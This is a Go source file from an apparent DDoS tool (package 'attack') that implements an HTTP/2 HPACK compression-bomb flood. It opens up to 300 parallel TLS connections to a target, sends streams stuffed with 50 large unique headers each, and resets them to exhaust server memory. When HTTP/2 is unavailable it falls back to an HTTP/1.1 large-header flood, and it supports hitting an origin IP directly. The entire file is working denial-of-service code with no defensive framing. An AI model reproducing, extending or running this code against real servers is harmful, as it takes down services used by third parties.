package attack

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// HPACK Compression Bomb (CVE-2016-1546 evolved)
// Sends many HEADERS with reusable HPACK indices
// Server's HPACK dynamic table grows uncontrollably
// Combined with 100+ streams = memory exhaustion

func runHpackBomb(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	host, port, path, errParse := parseTargetForH2(cfg.Target)
	if errParse != nil {
		log.Printf("Invalid target: %v", errParse)
		return
	}

	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	connCount := cfg.Threads
	if connCount < 30 {
		connCount = 50
	}
	if connCount > 300 {
		connCount = 300
	}

	log.Printf("HPACK Compression Bomb: %d parallel H2 connections to %s:%s%s", connCount, host, port, path)

	var wg sync.WaitGroup
	for i := 0; i < connCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("HPACK worker %d recovered: %v", id, r)
				}
			}()

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}

				err := hpackBombConn(host, port, path, deadline)
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
					time.Sleep(50 * time.Millisecond)
				}
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func hpackBombConn(host, port, path string, deadline time.Time) error {
	dial := createDialer("", 10*time.Second)
	rawConn, err := dial("tcp", host+":"+port)
	if err != nil {
		return err
	}

	if tcpConn, ok := rawConn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
	}

	tlsConn := tls.Client(rawConn, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
		NextProtos:         []string{"h2"},
	})
	tlsConn.SetDeadline(time.Now().Add(15 * time.Second))

	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}

	state := tlsConn.ConnectionState()
	if state.NegotiatedProtocol != "h2" {
		// Fallback: Server doesn't support HTTP/2, use HTTP/1.1 flood instead
		tlsConn.Close()
		return fallbackHTTP1FloodHpack(rawConn, host, port, path, deadline)
	}

	defer tlsConn.Close()
	tlsConn.SetDeadline(time.Time{})

	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
		return err
	}

	framer := http2.NewFramer(tlsConn, tlsConn)
	framer.SetMaxReadFrameSize(65536)

	// Request HUGE HPACK dynamic table size
	framer.WriteSettings(
		http2.Setting{ID: http2.SettingHeaderTableSize, Val: 65536},
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1048576},
		http2.Setting{ID: http2.SettingMaxHeaderListSize, Val: 1048576},
	)

	// Drain server frames
	go func() {
		defer func() { recover() }()
		for {
			tlsConn.SetReadDeadline(time.Now().Add(2 * time.Second))
			_, err := framer.ReadFrame()
			if err != nil {
				return
			}
		}
	}()

	authority := host
	if port != "443" {
		authority = host + ":" + port
	}

	streamID := uint32(1)
	connDeadline := time.Now().Add(30 * time.Second)

	// HPACK encoder - shared across all streams to grow dynamic table
	var hpackBuf bytes.Buffer
	encoder := hpack.NewEncoder(&hpackBuf)

	for time.Now().Before(deadline) && time.Now().Before(connDeadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return nil
		}

		// Send 100 streams per loop
		for i := 0; i < 100; i++ {
			hpackBuf.Reset()
			encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
			encoder.WriteField(hpack.HeaderField{Name: ":path", Value: path})
			encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
			encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})

			// Pollute dynamic table - 50 large unique custom headers per request
			// Each header forces server to allocate dynamic table entries
			for j := 0; j < 50; j++ {
				name := fmt.Sprintf("x-hpack-bomb-%d-%d", streamID, j)
				value := strings.Repeat("A", 200) + fmt.Sprintf("%d", time.Now().UnixNano())
				encoder.WriteField(hpack.HeaderField{Name: name, Value: value})
			}

			err := framer.WriteHeaders(http2.HeadersFrameParam{
				StreamID:      streamID,
				BlockFragment: hpackBuf.Bytes(),
				EndStream:     true,
				EndHeaders:    true,
			})
			if err != nil {
				atomic.AddInt64(&metrics.Failed, 1)
				return err
			}

			// Reset stream immediately - server keeps HPACK state
			framer.WriteRSTStream(streamID, http2.ErrCodeCancel)

			atomic.AddInt64(&metrics.TotalRequests, 1)
			atomic.AddInt64(&metrics.Completed, 1)
			streamID += 2

			if streamID > 0x7FFFFFFE {
				return nil
			}
		}

		time.Sleep(time.Millisecond)
	}

	framer.WriteGoAway(streamID, http2.ErrCodeNo, []byte{})
	return nil
}

// Fallback to HTTP/1.1 flood when HTTP/2 not supported
func fallbackHTTP1FloodHpack(rawConn net.Conn, host, port, path string, deadline time.Time) error {
	// Reopen connection since we closed TLS
	rawConn.Close()
	
	dial := createDialer("", 5*time.Second)
	conn, err := dial("tcp", host+":"+port)
	if err != nil {
		return fmt.Errorf("fallback dial: %w", err)
	}
	defer conn.Close()

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
		tcpConn.SetKeepAlive(true)
	}

	tlsConn := tls.Client(conn, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
	})
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		return fmt.Errorf("fallback handshake: %w", err)
	}
	tlsConn.SetDeadline(time.Time{})

	// Send rapid HTTP/1.1 requests with large headers
	for i := 0; i < 50 && time.Now().Before(deadline); i++ {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return nil
		}

		// Large header bomb
		largeHeader := strings.Repeat("X-Custom-Header-"+fmt.Sprintf("%d", i)+": "+strings.Repeat("A", 100)+"\r\n", 10)
		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n%sConnection: keep-alive\r\n\r\n",
			path, host, randomUA(), largeHeader)
		
		tlsConn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		_, err := tlsConn.Write([]byte(req))
		if err != nil {
			return err
		}

		atomic.AddInt64(&metrics.TotalRequests, 1)
		atomic.AddInt64(&metrics.Completed, 1)
	}

	return nil
}

